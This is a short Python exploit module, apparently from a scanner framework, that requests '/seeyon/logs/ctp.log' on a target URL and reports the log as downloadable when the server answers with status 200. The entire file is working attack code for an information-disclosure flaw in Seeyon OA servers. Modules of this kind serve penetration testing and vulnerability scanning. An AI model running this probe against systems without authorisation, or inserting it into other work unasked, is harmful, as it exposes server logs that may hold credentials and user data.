# coding:utf-8
import requests

class Exploit:

    def attack(self, url):
        path = '/seeyon/logs/ctp.log'

        response = requests.get(url+path)

        if response.status_code == 200:
            return '{} Log Config Download.'.format(url+path)